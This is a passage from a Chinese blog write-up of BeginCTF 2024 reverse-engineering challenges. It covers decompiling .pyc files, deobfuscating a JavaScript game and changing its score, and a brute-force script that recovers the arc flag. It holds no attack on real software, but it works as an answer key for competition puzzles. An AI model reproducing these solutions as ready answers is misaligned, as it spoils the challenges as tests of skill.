src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707442599961-93f1f62a-e681-4f3b-b0fa-10779f6d4dee.png" class="" title="img"><p>可以看到停在了输入</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707442732300-157a7c9c-9f40-4def-b496-c0a92d0d830b.png" class="" title="img"><p>不断ctrl+f7（找函数调用关系）</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707442802923-b739e556-ff29-4b2a-824f-fbe59734c8de.png" class="" title="img"><p>直接猜异或</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707458525652-680dcd9a-f6c9-443b-9571-2c9bc92e4d5f.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707458587664-2288be2f-1fbf-48f6-bb05-c1d12bbd0050.png" class="" title="img"><h2 id="ezpython-1"><a href="#ezpython-1" class="headerlink" title="ezpython-1"></a>ezpython-1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707120887922-79327588-3ce5-47ca-889c-07719f070107.png" class="" title="img"><p>找不到key和enc，要去secret.pyc里找</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707660671628-821c57a7-deef-4336-8d0c-1258c19ebb75.png" class="" title="img"><p>这就要求必须用python3.8反编译</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707660607445-846ae1d4-c518-4704-8444-17962f2f62fc.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707660956117-41b3e31e-53b3-44e7-b875-4717d0303fe7.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707661391820-58a10778-8bae-4a47-8464-5f800a4d648e.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707661489059-a1e589b1-a24c-49bf-a156-87d8278485ee.png" class="" title="img"><p>也可以直接大厨</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707661564081-3c191d71-680f-4c7a-85dc-b41c9b0ac2d5.png" class="" title="img"><h2 id="stick-game-1"><a href="#stick-game-1" class="headerlink" title="stick game-1"></a>stick game-1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707120977289-6e7c1f46-bcd4-4234-b46a-ebd2d1c5d516.png" class="" title="img"><p>类似于跳一跳</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707704152734-271b3e52-99a7-4c9d-ba16-b11d4c98fbfa.png" class="" title="img"><p>有obfus混淆</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707704373259-e33d8342-37ad-4ccc-9e87-3e3abb363947.png" class="" title="img"><p>用网站去混淆</p><p><a href="https://obf-io.deobfuscate.io/">Obfuscator.io Deobfuscator</a></p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707704572575-bd25beb4-6c1d-4211-b526-b57cfa846d3c.png" class="" title="img"><p>一开始let score&#x3D;0,后面会resetGame</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707719106980-8d0bacee-1c6e-4562-846c-0fa381c27f4a.png" class="" title="img"><p>直接去改关键词score，发现分数好像没变</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707718134832-1c26d106-c740-403c-a92e-c0f2eb9a921f.png" class="" title="img"><p>要么去case6score+&#x3D;99999999</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707720431663-2bee53a4-4c7a-4814-b092-b4519a7d910d.png" class="" title="img"><p>要么去改scoreElement，本质上还是score</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707718559473-d7e47894-cce2-44bc-b222-bf53e08dd3c3.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707718715247-bff32408-cd5a-49de-bb61-7174314e8a34.png" class="" title="img"><p>死了才能获得flag</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707719633093-d0beac54-2de3-4156-a768-47b095f1bd86.png" class="" title="img"><p>在html界面找到元素下断点，然后玩游戏立刻就能找到真正的score</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707720590048-5302baf7-f35e-47e1-90da-6bdf35dbf34a.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707720616352-aa4c715a-a434-450b-aef4-fa190d33fb0a.png" class="" title="img"><h2 id="arc-1"><a href="#arc-1" class="headerlink" title="arc-1"></a>arc-1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707121222466-68e10aee-9032-4ac8-af06-5ca26385b020.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707962263700-ab40b4a7-45cb-4513-b373-5ff93471bfa7.png" class="" title="img"><p>大致来说就是字典太多，pydc反编译不了，我这里用python3.8.3编译，用anconda默认的3.8.13不行</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707964240587-17304ea3-4469-4d36-9783-74cd9e22e384.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707965179736-105d7d87-bd35-49ee-b1dc-c583994edf67.png" class="" title="img"><p>一行行运行，得到类似结果</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707965467955-bbf9d5eb-803c-49f6-ad53-fdc1570f8d21.png" class="" title="img"><p>最终是list里又是list</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707965981359-7e524d61-b5d9-402a-a372-f7d8b3cc64c4.png" class="" title="img"><p>替换之后发现是3维列表</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707978844528-72da01e6-a317-49d8-b4d6-744c5f4b5d19.png" class="" title="img"><p>最后也就是这个样子，不懂的可以问gpt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span><br>(<br>    <span class="hljs-built_in">all</span><br>    (<br>        [<br>            [data][a][d] == e <br>            <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span><br>            (<br>                [<br>                    [<span class="hljs-built_in">int</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">sum</span>((<span class="hljs-built_in">ord</span>(b) &lt;&lt; <span class="hljs-number">6</span> ^ <span class="hljs-number">4102</span> - a ^ c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">b&#x27;beginCTF&#x27;</span>))).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)] <br>                    <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span><br>                    (<br>                        <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+]Flag: &#x27;</span>)<br>                    )<br>                ]<br>            ) <br>            <span class="hljs-keyword">for</span> d,e <span class="hljs-keyword">in</span> <span class="hljs-built_in">iter</span> <span class="hljs-comment">#迭代器</span><br>            (<br>                (<span class="hljs-built_in">enumerate</span>(b))<br>            )<br>        ]<br>    )<br></code></pre></td></tr></table></figure><p>写脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">data = [[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>]]<br><br><span class="hljs-keyword">for</span> i, lst <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data): <span class="hljs-comment">#i是索引，lst是子序列（每一行）</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>): <span class="hljs-comment">#爆破有效字符</span><br>        n = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> lst]), <span class="hljs-number">2</span>) <span class="hljs-comment">#把每一行的数字连起来变成二进制，再转换为十进制</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>((j &lt;&lt; <span class="hljs-number">6</span> ^ <span class="hljs-number">4102</span> - i ^ key <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> <span class="hljs-string">b&#x27;beginCTF&#x27;</span>)) == n: <br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j), end=<span class="hljs-string">&quot;&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><span 